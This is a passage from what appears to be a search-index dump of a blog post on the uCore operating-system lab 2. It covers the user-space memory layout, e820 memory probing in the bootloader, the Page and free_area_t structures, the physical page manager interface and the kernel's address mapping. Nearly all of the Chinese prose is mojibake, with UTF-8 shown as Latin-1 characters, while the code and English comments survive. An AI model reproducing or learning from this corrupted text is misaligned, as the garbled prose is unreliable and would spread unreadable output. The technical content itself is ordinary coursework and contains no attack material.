¸æ€åï¼Œå°±å¯ä»¥å¾ˆæ–¹ä¾¿åœ°è®¿é—®å†…æ ¸ç©ºé—´å†…å­˜ã€‚ æ¯ä¸ªè¿›ç¨‹çš„å†…æ ¸ç©ºé—´éƒ½æ˜¯ä¸€è‡´çš„æ¥ä¸‹æ¥ï¼Œè¿›ä¸€æ­¥äº†è§£è™šæ‹Ÿç©ºé—´çš„åˆ’åˆ†æƒ…å†µï¼Œç”¨æˆ·ç©ºé—´å’Œå†…æ ¸ç©ºé—´åˆ’åˆ†çš„æ–¹å¼æ˜¯ä¸åŒçš„ï¼Œå†…æ ¸ç©ºé—´çš„åˆ†å¸ƒæƒ…å†µå°±ä¸å¤šè¯´äº†ã€‚æˆ‘ä»¬çœ‹çœ‹ç”¨æˆ·ç©ºé—´åˆ†å¸ƒçš„æƒ…å†µï¼Œä»¥ 32 ä½ç³»ç»Ÿä¸ºä¾‹ï¼š è™šæ‹Ÿå†…å­˜ç©ºé—´åˆ’åˆ†é€šè¿‡è¿™å¼ å›¾ä½ å¯ä»¥çœ‹åˆ°ï¼Œç”¨æˆ·ç©ºé—´å†…å­˜ï¼Œä»ä½åˆ°é«˜åˆ†åˆ«æ˜¯ 7 ç§ä¸åŒçš„å†…å­˜æ®µï¼š ç¨‹åºæ–‡ä»¶æ®µï¼ŒåŒ…æ‹¬äºŒè¿›åˆ¶å¯æ‰§è¡Œä»£ç ï¼› å·²åˆå§‹åŒ–æ•°æ®æ®µï¼ŒåŒ…æ‹¬é™æ€å¸¸é‡ï¼› æœªåˆå§‹åŒ–æ•°æ®æ®µï¼ŒåŒ…æ‹¬æœªåˆå§‹åŒ–çš„é™æ€å˜é‡ï¼› å †æ®µï¼ŒåŒ…æ‹¬åŠ¨æ€åˆ†é…çš„å†…å­˜ï¼Œä»ä½åœ°å€å¼€å§‹å‘ä¸Šå¢é•¿ï¼› æ–‡ä»¶æ˜ å°„æ®µï¼ŒåŒ…æ‹¬åŠ¨æ€åº“ã€å…±äº«å†…å­˜ç­‰ï¼Œä»ä½åœ°å€å¼€å§‹å‘ä¸Šå¢é•¿ï¼ˆè·Ÿç¡¬ä»¶å’Œå†…æ ¸ç‰ˆæœ¬æœ‰å…³ï¼‰ æ ˆæ®µï¼ŒåŒ…æ‹¬å±€éƒ¨å˜é‡å’Œå‡½æ•°è°ƒç”¨çš„ä¸Šä¸‹æ–‡ç­‰ã€‚æ ˆçš„å¤§å°æ˜¯å›ºå®šçš„ï¼Œä¸€èˆ¬æ˜¯ 8 MBã€‚å½“ç„¶ç³»ç»Ÿä¹Ÿæä¾›äº†å‚æ•°ï¼Œä»¥ä¾¿æˆ‘ä»¬è‡ªå®šä¹‰å¤§å°ï¼› åœ¨è¿™ 7 ä¸ªå†…å­˜æ®µä¸­ï¼Œå †å’Œæ–‡ä»¶æ˜ å°„æ®µçš„å†…å­˜æ˜¯åŠ¨æ€åˆ†é…çš„ã€‚æ¯”å¦‚è¯´ï¼Œä½¿ç”¨ C æ ‡å‡†åº“çš„ malloc() æˆ–è€… mmap() ï¼Œå°±å¯ä»¥åˆ†åˆ«åœ¨å †å’Œæ–‡ä»¶æ˜ å°„æ®µåŠ¨æ€åˆ†é…å†…å­˜ã€‚ ","date":"2021-07-10","objectID":"/ucore-lab-2/:0:1","series":null,"tags":["Pwn"],"title":"UCore Lab 2","uri":"/ucore-lab-2/#linux-çš„è™šæ‹Ÿåœ°å€ç©ºé—´åˆ†å¸ƒ"},{"categories":["Pwning"],"content":"uCoreç‰©ç†å†…å­˜æ¢æµ‹å½“æ“ä½œç³»ç»Ÿè¢«å¯åŠ¨ä¹‹åï¼Œæœ€é‡è¦çš„äº‹æƒ…å°±æ˜¯çŸ¥é“è¿˜æœ‰å¤šå°‘å†…å­˜å¯ç”¨ï¼Œä¸€èˆ¬æ¥è¯´ï¼Œè·å–å†…å­˜å¤§å°çš„æ–¹æ³•ç”± BIOS ä¸­æ–­è°ƒç”¨å’Œç›´æ¥æ¢æµ‹ä¸¤ç§ã€‚ä½†BIOS ä¸­æ–­è°ƒç”¨æ–¹æ³•æ˜¯ä¸€èˆ¬åªèƒ½åœ¨å®æ¨¡å¼ä¸‹å®Œæˆï¼Œè€Œç›´æ¥æ¢æµ‹æ–¹æ³•å¿…é¡»åœ¨ä¿æŠ¤æ¨¡å¼ä¸‹å®Œæˆã€‚é€šè¿‡ BIOS ä¸­æ–­è·å–å†…å­˜å¸ƒå±€æœ‰ä¸‰ç§æ–¹å¼ï¼Œéƒ½æ˜¯åŸºäºint 15hä¸­æ–­ï¼Œåˆ†åˆ«ä¸º88h, e801h, e820hã€‚ä½†æ˜¯å¹¶éåœ¨æ‰€æœ‰æƒ…å†µä¸‹è¿™ä¸‰ç§æ–¹å¼éƒ½èƒ½å·¥ä½œã€‚åœ¨ Linux kernel é‡Œï¼Œé‡‡ç”¨çš„æ–¹æ³•æ˜¯ä¾æ¬¡å°è¯•è¿™ä¸‰ ç§æ–¹æ³•ã€‚è€Œåœ¨æœ¬å®éªŒä¸­ï¼Œæˆ‘ä»¬é€šè¿‡e820hä¸­æ–­è·å–å†…å­˜ä¿¡æ¯ã€‚å› ä¸ºe820hä¸­æ–­å¿…é¡»åœ¨å®æ¨¡å¼ä¸‹ä½¿ç”¨ï¼Œæ‰€ä»¥æˆ‘ä»¬åœ¨ bootloader è¿›å…¥ä¿æŠ¤æ¨¡å¼ä¹‹å‰è°ƒç”¨è¿™ä¸ª BIOS ä¸­æ–­ï¼Œå¹¶ä¸”æŠŠ e820 æ˜ å°„ç»“æ„ä¿å­˜åœ¨ç‰©ç†åœ°å€0x8000å¤„ã€‚ BIOSé€šè¿‡ç³»ç»Ÿå†…å­˜æ˜ å°„åœ°å€æè¿°ç¬¦ï¼ˆAddress Range Descriptorï¼‰æ ¼å¼æ¥è¡¨ç¤ºç³»ç»Ÿç‰©ç†å†…å­˜å¸ƒå±€ï¼Œå…¶å…·ä½“è¡¨ç¤ºå¦‚ä¸‹ï¼š Offset Size Description 00h 8å­—èŠ‚ base address #ç³»ç»Ÿå†…å­˜å—åŸºåœ°å€ 08h 8å­—èŠ‚ length in bytes #ç³»ç»Ÿå†…å­˜å¤§å° 10h 4å­—èŠ‚ type of address range #å†…å­˜ç±»å‹ INT15h BIOSä¸­æ–­çš„è¯¦ç»†è°ƒç”¨å‚æ•°: eaxï¼še820hï¼šINT 15çš„ä¸­æ–­è°ƒç”¨å‚æ•°ï¼› edxï¼š534D4150h (å³4ä¸ªASCIIå­—ç¬¦â€œSMAPâ€) ï¼Œè¿™åªæ˜¯ä¸€ä¸ªç­¾åè€Œå·²ï¼› ebxï¼šå¦‚æœæ˜¯ç¬¬ä¸€æ¬¡è°ƒç”¨æˆ–å†…å­˜åŒºåŸŸæ‰«æå®Œæ¯•ï¼Œåˆ™ä¸º0ã€‚ å¦‚æœä¸æ˜¯ï¼Œåˆ™å­˜æ”¾ä¸Šæ¬¡è°ƒç”¨ä¹‹åçš„è®¡æ•°å€¼ï¼› ecxï¼šä¿å­˜åœ°å€èŒƒå›´æè¿°ç¬¦çš„å†…å­˜å¤§å°,åº”è¯¥å¤§äºç­‰äº20å­—èŠ‚ï¼› es:diï¼šæŒ‡å‘ä¿å­˜åœ°å€èŒƒå›´æè¿°ç¬¦ç»“æ„çš„ç¼“å†²åŒºï¼ŒBIOSæŠŠä¿¡æ¯å†™å…¥è¿™ä¸ªç»“æ„çš„èµ·å§‹åœ°å€ã€‚ æ­¤ä¸­æ–­çš„è¿”å›å€¼ä¸º: cflagsçš„CFä½ï¼šè‹¥INT 15ä¸­æ–­æ‰§è¡ŒæˆåŠŸï¼Œåˆ™ä¸ç½®ä½ï¼Œå¦åˆ™ç½®ä½ï¼› eaxï¼š534D4150h ('SMAP') ï¼› es:diï¼šæŒ‡å‘ä¿å­˜åœ°å€èŒƒå›´æè¿°ç¬¦çš„ç¼“å†²åŒº,æ­¤æ—¶ç¼“å†²åŒºå†…çš„æ•°æ®å·²ç”±BIOSå¡«å†™å®Œæ¯• ebxï¼šä¸‹ä¸€ä¸ªåœ°å€èŒƒå›´æè¿°ç¬¦çš„è®¡æ•°åœ°å€ ecxï¼šè¿”å›BIOSå¾€ES:DIå¤„å†™çš„åœ°å€èŒƒå›´æè¿°ç¬¦çš„å­—èŠ‚å¤§å° ahï¼šå¤±è´¥æ—¶ä¿å­˜å‡ºé”™ä»£ç  è¿™æ ·ï¼Œæˆ‘ä»¬é€šè¿‡è°ƒç”¨INT 15h BIOSä¸­æ–­ï¼Œé€’å¢diçš„å€¼ï¼ˆ20çš„å€æ•°ï¼‰ï¼Œè®©BIOSå¸®æˆ‘ä»¬æŸ¥æ‰¾å‡ºä¸€ä¸ªä¸€ä¸ªçš„å†…å­˜å¸ƒå±€entryï¼Œå¹¶æ”¾å…¥åˆ°ä¸€ä¸ªä¿å­˜åœ°å€èŒƒå›´æè¿°ç¬¦ç»“æ„çš„ç¼“å†²åŒºä¸­ï¼Œä¾›åç»­çš„ucoreè¿›ä¸€æ­¥è¿›è¡Œç‰©ç†å†…å­˜ç®¡ç†ã€‚è¿™ä¸ªç¼“å†²åŒºç»“æ„å®šä¹‰åœ¨memlayout.hä¸­ï¼š struct e820map { // e820 æ˜ å°„ç»“æ„ä¿å­˜åœ¨ç‰©ç†åœ°å€0x8000å¤„ int nr_map; // mapä¸­çš„å…ƒç´ ä¸ªæ•° struct { uint64_t addr; // å†…å­˜å—çš„èµ·å§‹åœ°å€ uint64_t size; // å†…å­˜å—çš„å¤§å° uint32_t type; // å†…å­˜å—çš„ç±»å‹ï¼Œ1æ ‡è¯†å¯è¢«ä½¿ç”¨å†…å­˜å—ï¼›2è¡¨ç¤ºä¿ç•™çš„å†…å­˜å—ï¼Œä¸å¯æ˜ å°„ã€‚ } __attribute__((packed)) map[E820MAX]; }; è¿™æ ·å°±åœ¨bootmain.Sä¸­æ–°å¢äº†ä¸€æ®µä»£ç ï¼š probe_memory: movl $0, 0x8000 ;é¦–å…ˆï¼Œè®¾ç½®`nr_map = 0` xorl %ebx, %ebx ;int 15hçš„å‚æ•°ï¼Œç¬¬ä¸€æ¬¡è°ƒç”¨ç½®ä¸º0 movw $0x8004, %di ;rdiç½®ä¸ºç¬¬ä¸€å—mapç»“æ„çš„èµ·å§‹åœ°å€ start_probe: movl $0xE820, %eax ;ä¸­æ–­è°ƒç”¨å‚æ•°ï¼Œèµ‹å€¼ç»™eax movl $20, %ecx ;ä¿å­˜åœ°å€èŒƒå›´æè¿°ç¬¦çš„å†…å­˜å¤§å° movl $SMAP, %edx ;ç­¾åâ€œSMAPâ€ int $0x15 ;è°ƒç”¨ä¸­æ–­ jnc cont ;å¦‚æœeflagsçš„CFä½ä¸º0ï¼Œåˆ™è¡¨ç¤ºè¿˜æœ‰å†…å­˜æ®µéœ€è¦æ¢æµ‹ï¼Œå¦‚æœè¯¥ä¸­æ–­æ‰§è¡Œå¤±è´¥ï¼Œåˆ™CFæ ‡å¿—ä½ä¼šç½®1 movw $12345, 0x8000 ;æ¢æµ‹æœ‰é—®é¢˜ï¼Œå‘ç»“æ„e820mapä¸­çš„æˆå‘˜nr_mapä¸­å†™å…¥ç‰¹æ®Šä¿¡æ¯ï¼Œç»“æŸæ¢æµ‹ jmp finish_probe cont: addw $20, %di ;å¦‚æœä¸­æ–­æ‰§è¡Œæ­£å¸¸ï¼Œåˆ™ç›®æ ‡å†™å…¥åœ°å€å°±å‘åç§»åŠ¨ä¸€ä¸ªä½ç½®+20å­—èŠ‚ incl 0x8000 ;`nr_map++` cmpl $0, %ebx ;æ‰§è¡Œä¸­æ–­åï¼Œè¿”å›çš„ebxæ˜¯åŸå…ˆçš„ebxåŠ ä¸€ã€‚å¦‚æœebxä¸º0ï¼Œåˆ™è¯´æ˜å½“å‰å†…å­˜æ¢æµ‹å®Œæˆ jnz start_probe finish_probe: ä¸Šè¿°ä»£ç æ­£å¸¸æ‰§è¡Œå®Œæ¯•åï¼Œåœ¨0x8000åœ°å€å¤„ä¿å­˜äº†ä»BIOSä¸­è·å¾—çš„å†…å­˜åˆ†å¸ƒä¿¡æ¯ï¼Œæ­¤ä¿¡æ¯æŒ‰ç…§struct e820mapçš„è®¾ç½®æ¥è¿›è¡Œå¡«å……ã€‚è¿™éƒ¨åˆ†ä¿¡æ¯å°†åœ¨bootloaderå¯åŠ¨ucoreåï¼Œç”±ucoreçš„page_initå‡½æ•°æ¥æ ¹æ®struct e820mapçš„memmapï¼ˆå®šä¹‰äº†èµ·å§‹åœ°å€ä¸º0x8000ï¼‰æ¥å®Œæˆå¯¹æ•´ä¸ªæœºå™¨ä¸­çš„ç‰©ç†å†…å­˜çš„æ€»ä½“ç®¡ç†ã€‚ ","date":"2021-07-10","objectID":"/ucore-lab-2/:0:0","series":null,"tags":["Pwn"],"title":"UCore Lab 2","uri":"/ucore-lab-2/#ucoreç‰©ç†å†…å­˜æ¢æµ‹"},{"categories":["Pwning"],"content":"uCoreç‰©ç†é¡µç®¡ç†åœ¨è·å¾—å¯ç”¨ç‰©ç†å†…å­˜èŒƒå›´åï¼Œç³»ç»Ÿéœ€è¦å»ºç«‹ç›¸åº”çš„æ•°æ®ç»“æ„æ¥ç®¡ç†ä»¥ç‰©ç†é¡µä¸ºæœ€å°å•ä½çš„æ•´ä¸ªç‰©ç†å†…å­˜ï¼Œä»¥é…åˆåç»­æ¶‰åŠçš„åˆ†é¡µç®¡ç†æœºåˆ¶ã€‚æ¯ä¸ªç‰©ç†é¡µå¯ä»¥ç”¨ä¸€ä¸ª Pageæ•°æ®ç»“æ„æ¥è¡¨ç¤ºã€‚ç”±äºä¸€ä¸ªç‰©ç†é¡µéœ€è¦å ç”¨ä¸€ä¸ªPageç»“æ„çš„ç©ºé—´ï¼ŒPageç»“æ„åœ¨è®¾è®¡æ—¶é¡»å°½å¯èƒ½å°ï¼Œä»¥å‡å°‘å¯¹å†…å­˜çš„å ç”¨ã€‚Pageçš„å®šä¹‰åœ¨kern/mm/memlayout.hä¸­ã€‚ä»¥é¡µä¸ºå•ä½çš„ç‰©ç†å†…å­˜åˆ†é…ç®¡ç†çš„å®ç°åœ¨kern/default_pmm.[ch]ã€‚ ä¸ºäº†ä¸ä»¥åçš„åˆ†é¡µæœºåˆ¶é…åˆï¼Œæˆ‘ä»¬é¦–å…ˆéœ€è¦å»ºç«‹å¯¹æ•´ä¸ªè®¡ç®—æœºçš„æ¯ä¸€ä¸ªç‰©ç†é¡µçš„å±æ€§ç”¨ç»“æ„Pageæ¥è¡¨ç¤ºï¼Œå®ƒåŒ…å«äº†æ˜ å°„æ­¤ç‰©ç†é¡µçš„è™šæ‹Ÿé¡µä¸ªæ•°ï¼Œæè¿°ç‰©ç†é¡µå±æ€§çš„flagså’ŒåŒå‘é“¾æ¥å„ä¸ªPageç»“æ„çš„page_linkåŒå‘é“¾è¡¨ã€‚ struct Page { int ref; // page frame's reference counter uint32_t flags; // array of flags that describe the status of the page frame unsigned int property; // the num of free block, used in first fit pm manager list_entry_t page_link; // free list link }; refè¡¨ç¤ºè¿™ä¸ªé¡µè¢«é¡µè¡¨çš„å¼•ç”¨è®°æ•°ã€‚å¦‚æœè¿™ä¸ªé¡µè¢«é¡µè¡¨å¼•ç”¨äº†ï¼Œå³åœ¨æŸé¡µè¡¨ä¸­æœ‰ä¸€ä¸ªé¡µè¡¨é¡¹è®¾ç½®äº†ä¸€ä¸ªè™šæ‹Ÿé¡µåˆ°è¿™ä¸ªPageç®¡ç†çš„ç‰©ç†é¡µçš„æ˜ å°„å…³ç³»ï¼Œå°±ä¼šæŠŠPageçš„refåŠ ä¸€ï¼›åä¹‹ï¼Œè‹¥é¡µè¡¨é¡¹å–æ¶ˆï¼Œå³æ˜ å°„å…³ç³»è§£é™¤ï¼Œå°±ä¼šæŠŠPageçš„refå‡ä¸€ã€‚ flagsè¡¨ç¤ºæ­¤ç‰©ç†é¡µçš„çŠ¶æ€æ ‡è®°ï¼Œè¿›ä¸€æ­¥æŸ¥çœ‹kern/mm/memlayout.hä¸­çš„å®šä¹‰ï¼Œå¯ä»¥çœ‹åˆ°ï¼š /* Flags describing the status of a page frame */ #define PG_reserved 0 // the page descriptor is reserved for kernel or unusable #define PG_property 1 // the member 'property' is valid è¿™è¡¨ç¤ºflagsç›®å‰ç”¨åˆ°äº†ä¸¤ä¸ªbitè¡¨ç¤ºé¡µç›®å‰å…·æœ‰çš„ä¸¤ç§å±æ€§ï¼Œbit 0è¡¨ç¤ºæ­¤é¡µæ˜¯å¦è¢«ä¿ç•™ï¼ˆreservedï¼‰ï¼Œå¦‚æœæ˜¯è¢«ä¿ç•™çš„é¡µï¼Œåˆ™bit 0ä¼šè®¾ç½®ä¸º1ï¼Œä¸”ä¸èƒ½æ”¾åˆ°ç©ºé—²é¡µé“¾è¡¨ä¸­ï¼Œå³è¿™æ ·çš„é¡µä¸æ˜¯ç©ºé—²é¡µï¼Œä¸èƒ½åŠ¨æ€åˆ†é…ä¸é‡Šæ”¾ã€‚æ¯”å¦‚ç›®å‰å†…æ ¸ä»£ç å ç”¨çš„ç©ºé—´å°±å±äºè¿™æ ·â€œè¢«ä¿ç•™â€çš„é¡µã€‚åœ¨æœ¬å®éªŒä¸­ï¼Œbit 1è¡¨ç¤ºæ­¤é¡µæ˜¯å¦æ˜¯freeçš„ï¼Œå¦‚æœè®¾ç½®ä¸º1ï¼Œè¡¨ç¤ºè¿™é¡µæ˜¯freeçš„ï¼Œå¯ä»¥è¢«åˆ†é…ï¼›å¦‚æœè®¾ç½®ä¸º0ï¼Œè¡¨ç¤ºè¿™é¡µå·²ç»è¢«åˆ†é…å‡ºå»äº†ï¼Œä¸èƒ½å†è¢«äºŒæ¬¡åˆ†é…ã€‚ åœ¨æœ¬å®éªŒä¸­ï¼ŒPageæ•°æ®ç»“æ„çš„æˆå‘˜å˜é‡propertyç”¨æ¥è®°å½•æŸè¿ç»­å†…å­˜ç©ºé—²å—çš„å¤§å°ï¼ˆå³åœ°å€è¿ç»­çš„ç©ºé—²é¡µçš„ä¸ªæ•°ï¼‰ã€‚è¿™é‡Œéœ€è¦æ³¨æ„çš„æ˜¯ç”¨åˆ°æ­¤æˆå‘˜å˜é‡çš„è¿™ä¸ªPageæ¯”è¾ƒç‰¹æ®Šï¼Œæ˜¯è¿™ä¸ªè¿ç»­å†…å­˜ç©ºé—²å—åœ°å€æœ€å°çš„ä¸€é¡µï¼ˆå³å¤´ä¸€é¡µï¼Œ Head Pageï¼‰ã€‚è¿ç»­å†…å­˜ç©ºé—²å—åˆ©ç”¨è¿™ä¸ªé¡µçš„æˆå‘˜å˜é‡propertyæ¥è®°å½•åœ¨æ­¤å—å†…çš„ç©ºé—²é¡µçš„ä¸ªæ•°ã€‚ ä¸ºäº†æœ‰æ•ˆåœ°ç®¡ç†è¿™äº›å°è¿ç»­å†…å­˜ç©ºé—²å—ã€‚æ‰€æœ‰çš„è¿ç»­å†…å­˜ç©ºé—²å—å¯ç”¨ä¸€ä¸ªåŒå‘é“¾è¡¨ç®¡ç†èµ·æ¥ï¼Œä¾¿äºåˆ†é…å’Œé‡Šæ”¾ï¼Œä¸ºæ­¤å®šä¹‰äº†ä¸€ä¸ªfree_area_tæ•°æ®ç»“æ„ï¼ŒåŒ…å«äº†ä¸€ä¸ªlist_entryç»“æ„çš„åŒå‘é“¾è¡¨æŒ‡é’ˆå’Œè®°å½•å½“å‰ç©ºé—²é¡µçš„ä¸ªæ•°çš„æ— ç¬¦å·æ•´å‹å˜é‡nr_freeã€‚å…¶ä¸­çš„é“¾è¡¨æŒ‡é’ˆæŒ‡å‘äº†ç©ºé—²çš„ç‰©ç†é¡µã€‚ /* free_area_t - maintains a doubly linked list to record free (unused) pages */ typedef struct { list_entry_t free_list; // the list header unsigned int nr_free; // # of free pages in this free list } free_area_t; æœ‰äº†è¿™ä¸¤ä¸ªæ•°æ®ç»“æ„ï¼Œucoreå°±å¯ä»¥ç®¡ç†èµ·æ¥æ•´ä¸ªä»¥é¡µä¸ºå•ä½çš„ç‰©ç†å†…å­˜ç©ºé—´ã€‚æ¥ä¸‹æ¥éœ€è¦è§£å†³ä¸¤ä¸ªé—®é¢˜ï¼š ç®¡ç†é¡µçº§ç‰©ç†å†…å­˜ç©ºé—´æ‰€éœ€çš„Pageç»“æ„çš„å†…å­˜ç©ºé—´ä»å“ªé‡Œå¼€å§‹ï¼Œå å¤šå¤§ç©ºé—´ï¼Ÿ ç©ºé—²å†…å­˜ç©ºé—´çš„èµ·å§‹åœ°å€åœ¨å“ªé‡Œï¼Ÿ å¯¹äºè¿™ä¸¤ä¸ªé—®é¢˜ï¼Œæˆ‘ä»¬é¦–å…ˆæ ¹æ®bootloaderç»™å‡ºçš„å†…å­˜å¸ƒå±€ä¿¡æ¯æ‰¾å‡ºæœ€å¤§çš„ç‰©ç†å†…å­˜åœ°å€maxpaï¼ˆå®šä¹‰åœ¨page_initå‡½æ•°ä¸­çš„å±€éƒ¨å˜é‡ï¼‰ï¼Œç”±äºx86çš„èµ·å§‹ç‰©ç†å†…å­˜åœ°å€ä¸º0ï¼Œæ‰€ä»¥å¯ä»¥å¾—çŸ¥éœ€è¦ç®¡ç†çš„ç‰©ç†é¡µä¸ªæ•°ä¸º npage = maxpa / PGSIZE è¿™æ ·ï¼Œæˆ‘ä»¬å°±å¯ä»¥é¢„ä¼°å‡ºç®¡ç†é¡µçº§ç‰©ç†å†…å­˜ç©ºé—´æ‰€éœ€çš„Pageç»“æ„çš„å†…å­˜ç©ºé—´æ‰€éœ€çš„å†…å­˜å¤§å°ä¸ºï¼š sizeof(struct Page) * npage) ç”±äºbootloaderåŠ è½½ucoreçš„ç»“æŸåœ°å€ï¼ˆç”¨å…¨å±€æŒ‡é’ˆå˜é‡endè®°å½•ï¼‰ä»¥ä¸Šçš„ç©ºé—´æ²¡æœ‰è¢«ä½¿ç”¨ï¼Œæ‰€ä»¥æˆ‘ä»¬å¯ä»¥æŠŠendæŒ‰é¡µå¤§å°ä¸ºè¾¹ç•Œå‘ä¸Šå–æ•´åï¼Œä½œä¸ºç®¡ç†é¡µçº§ç‰©ç†å†…å­˜ç©ºé—´æ‰€éœ€çš„Pageç»“æ„çš„å†…å­˜ç©ºé—´ï¼Œè®°ä¸ºï¼š pages = (struct Page *)ROUNDUP((void *)end, PGSIZE); ä¸ºäº†ç®€åŒ–èµ·è§ï¼Œä»åœ°å€0åˆ°åœ°å€pages+ sizeof(struct Page) * npage)ç»“æŸçš„ç‰©ç†å†…å­˜ç©ºé—´è®¾å®šä¸ºå·²å ç”¨ç‰©ç†å†…å­˜ç©ºé—´ï¼ˆèµ·å§‹0~640KBçš„ç©ºé—´æ˜¯ç©ºé—²çš„ï¼‰ï¼Œåœ°å€pages+ sizeof(struct Page) * npage)ä»¥ä¸Šçš„ç©ºé—´ä¸ºç©ºé—²ç‰©ç†å†…å­˜ç©ºé—´ï¼Œè¿™æ—¶çš„ç©ºé—²ç©ºé—´èµ·å§‹åœ°å€ä¸º uintptr_t freemem = PADDR((uintptr_t)pages + sizeof(struct Page) * npage); ä¸ºæ­¤æˆ‘ä»¬éœ€è¦æŠŠè¿™ä¸¤éƒ¨åˆ†ç©ºé—´ç»™æ ‡è¯†å‡ºæ¥ã€‚é¦–å…ˆï¼Œå¯¹äºæ‰€æœ‰ç‰©ç†ç©ºé—´ï¼Œé€šè¿‡å¦‚ä¸‹è¯­å¥å³å¯å®ç°å ç”¨æ ‡è®°ï¼š for (i = 0; i \u003c npage; i ++) { SetPageReserved(pages + i); } ç„¶åï¼Œæ ¹æ®æ¢æµ‹åˆ°çš„ç©ºé—²ç‰©ç†ç©ºé—´ï¼Œé€šè¿‡å¦‚ä¸‹è¯­å¥å³å¯å®ç°ç©ºé—²æ ‡è®°ï¼š //è·å¾—ç©ºé—²ç©ºé—´çš„èµ·å§‹åœ°å€beginå’Œç»“æŸåœ°å€end â€¦â€¦ init_memmap(pa2page(begin), (end - begin) / PGSIZE); å…¶å®SetPageReservedåªéœ€æŠŠç‰©ç†åœ°å€å¯¹åº”çš„Pageç»“æ„ä¸­çš„flagsæ ‡å¿—è®¾ç½®ä¸ºPG_reserved ï¼Œè¡¨ç¤ºè¿™äº›é¡µå·²ç»è¢«ä½¿ç”¨äº†ï¼Œå°†æ¥ä¸èƒ½è¢«ç”¨äºåˆ†é…ã€‚è€Œinit_memmapå‡½æ•°åˆ™æ˜¯æŠŠç©ºé—²ç‰©ç†é¡µå¯¹åº”çš„Pageç»“æ„ä¸­çš„flagså’Œå¼•ç”¨è®¡æ•°refæ¸…é›¶ï¼Œå¹¶åŠ åˆ°free_area.free_listæŒ‡å‘çš„åŒå‘åˆ—è¡¨ä¸­ï¼Œä¸ºå°†æ¥çš„ç©ºé—²é¡µç®¡ç†åšå¥½åˆå§‹åŒ–å‡†å¤‡å·¥ä½œã€‚ å…¶å®å®éªŒäºŒåœ¨å†…å­˜åˆ†é…å’Œé‡Šæ”¾æ–¹é¢æœ€ä¸»è¦çš„ä½œç”¨æ˜¯å»ºç«‹äº†ä¸€ä¸ªç‰©ç†å†…å­˜é¡µç®¡ç†å™¨æ¡†æ¶ï¼Œè¿™å®é™…ä¸Šæ˜¯ä¸€ä¸ªå‡½æ•°æŒ‡é’ˆåˆ—è¡¨ï¼Œå®šä¹‰å¦‚ä¸‹ï¼š struct pmm_manager { const char *name; //ç‰©ç†å†…å­˜é¡µç®¡ç†å™¨çš„åå­— void (*init)(void); //åˆå§‹åŒ–å†…å­˜ç®¡ç†å™¨ void (*init_memmap)(struct Page *base, size_t n); //åˆå§‹åŒ–ç®¡ç†ç©ºé—²å†…å­˜é¡µçš„æ•°æ®ç»“æ„ struct Page *(*alloc_pages)(size_t n); //åˆ†é…nä¸ªç‰©ç†å†…å­˜é¡µ void (*free_pages)(struct Page *base, size_t n); //é‡Šæ”¾nä¸ªç‰©ç†å†…å­˜é¡µ size_t (*nr_free_pages)(void); //è¿”å›å½“å‰å‰©ä½™çš„ç©ºé—²é¡µæ•° void (*check)(void); //ç”¨äºæ£€æµ‹åˆ†é…/é‡Šæ”¾å®ç°æ˜¯å¦æ­£ç¡®çš„è¾…åŠ©å‡½æ•° }; é‡ç‚¹æ˜¯å®ç°init_memmap/ alloc_pages/ free_pagesè¿™ä¸‰ä¸ªå‡½æ•°ã€‚å½“å®Œæˆç‰©ç†å†…å­˜é¡µç®¡ç†åˆå§‹åŒ–å·¥ä½œåï¼Œè®¡ç®—æœºç³»ç»Ÿçš„å†…å­˜å¸ƒå±€å¦‚ä¸‹å›¾æ‰€ç¤ºï¼š +----------------------+ \u003c- 0xFFFFFFFF(4GB) ---------------------------- 4GB | ä¸€äº›ä¿ç•™å†…å­˜ï¼Œä¾‹å¦‚ç”¨äº| ä¿ç•™ç©ºé—´ | 32bitè®¾å¤‡æ˜ å°„ç©ºé—´ç­‰ | +----------------------+ \u003c- å®é™…ç‰©ç†å†…å­˜ç©ºé—´ç»“æŸåœ°å€ ---------------------------- | | | | | ç”¨äºåˆ†é…çš„ | å¯ç”¨çš„ç©ºé—´ | ç©ºé—²å†…å­˜åŒºåŸŸ | | | | | | | +----------------------+ \u003c- ç©ºé—²å†…å­˜èµ·å§‹åœ°å€ ---------------------------- | VPTé¡µè¡¨å­˜æ”¾ä½ç½® | VPTé¡µè¡¨å­˜æ”¾çš„ç©ºé—´ (4MBå·¦å³) +----------------------+ \u003c- bssæ®µç»“æŸå¤„ ---------------------------- |uCoreçš„textã€dataã€bss | uCoreå„æ®µçš„ç©ºé—´ +----------------------+ \u003c- 0x00100000(1MB) ---------------------------- 1MB | BIOS ROM | +----------------------+ \u003c- 0x000F0000(960KB) | 16bitè®¾å¤‡æ‰©å±•ROM | æ˜¾å­˜ä¸å…¶ä»–ROMæ˜ å°„çš„ç©ºé—´ +----------------------+ \u003c- 0x000C0000(768KB) | CGAæ˜¾å­˜ç©ºé—´ | +----------------------+ \u003c- 0x000B8000 ---------------------------- 736KB | ç©ºé—²å†…å­˜ | +------------","date":"2021-07-10","objectID":"/ucore-lab-2/:0:0","series":null,"tags":["Pwn"],"title":"UCore Lab 2","uri":"/ucore-lab-2/#ucoreç‰©ç†é¡µç®¡ç†"},{"categories":["Pwning"],"content":"åœ°å€æ˜ å°„åœ¨uCoreä¸­åœ°å€æ˜ å°„çš„å…³ç³»ä¸º virt addr = linear addr = phy addr + 0xC0000000 åœ¨kernel.ldä¸­ /* Load the kernel at this address: \".\" means the current address */ . = 0xC0100000; å¯ä»¥çœ‹åˆ°kernelè¢«åŠ è½½åˆ°0xC0100000ï¼Œè¿™ä¸ªåœ°å€æ˜¯è™šæ‹Ÿåœ°å€ã€‚è½¬æ¢ä¸ºç‰©ç†åœ°å€ä¸º0x100000ã€‚åœ¨lab1ä¸­ï¼Œè¿™é‡Œä¸º /* Load the kernel at this address: \".\" means the current address */ . = 0x100000; æœ€ç»ˆçš„ç‰©ç†åœ°å€æ˜¯ä¸€è‡´çš„ã€‚ åœ¨lab2/kern/init/init.cçš„kern_initå‡½æ•°ä¸­ï¼Œå£°æ˜äº†å¤–éƒ¨å…¨å±€å˜é‡ï¼š extern char edata[], end[]; ä½†æœå¯»æ‰€æœ‰æºç æ–‡ä»¶*.[ch]ï¼Œæ²¡æœ‰å‘ç°æœ‰è¿™ä¸¤ä¸ªå˜é‡çš„å®šä¹‰ã€‚é‚£è¿™ä¸¤ä¸ªå˜é‡ä»å“ªé‡Œæ¥çš„å‘¢ï¼Ÿå…¶å®åœ¨lab2/tools/kernel.ldä¸­ï¼Œå¯ä»¥çœ‹åˆ°å¦‚ä¸‹å†…å®¹ï¼š â€¦ .text : { *(.text .stub .text.* .gnu.linkonce.t.*) } â€¦ .data : { *(.data) 